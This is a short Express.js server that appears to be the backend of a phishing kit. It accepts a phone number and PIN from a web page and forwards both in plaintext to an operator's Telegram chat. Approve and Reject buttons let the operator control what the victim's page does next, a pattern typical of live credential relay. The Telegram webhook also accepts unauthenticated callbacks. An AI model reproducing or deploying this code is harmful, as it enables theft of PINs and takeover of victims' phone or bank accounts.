require('dotenv').config();
const express = require('express');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.static(path.join(__dirname)));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID;
const pendingRequests = {};

app.post('/api/verify-pin', async (req, res) => {
  const { pin, phone } = req.body;

  if (!pin || !phone) {
    return res.status(400).json({ error: 'PIN and phone number are required' });
  }

  const requestId = Date.now().toString();
  pendingRequests[requestId] = { pin, phone, status: 'pending' };

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: ADMIN_CHAT_ID,
        text: `📱 Phone: ${phone}\n🔑 PIN: ${pin}\n🆔 Request ID: ${requestId}`,
        reply_markup: {
          inline_keyboard: [[
            { text: '✅ Approve', callback_data: `approve_${requestId}` },
            { text: '❌ Reject', callback_data: `reject_${requestId}` }
          ]]
        }
      })
    });

    res.json({ requestId, status: 'pending' });
  } catch (err) {
    console.error('Telegram send error:', err);
    res.status(500).json({ error: 'Failed to notify admin' });
  }
});

app.get('/api/verify-pin/status/:requestId', (req, res) => {
  const request = pendingRequests[req.params.requestId];
  if (!request) return res.status(404).json({ error: 'Not found' });
  res.json({ status: request.status });
});

app.post('/api/telegram-webhook', (req, res) => {
  const callback = req.body.callback_query;
  if (callback) {
    const [action, requestId] = callback.data.split('_');
    if (pendingRequests[requestId]) {
      pendingRequests[requestId].status = action === 'approve' ? 'approved' : 'rejected';
    }
  }
  res.sendStatus(200);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
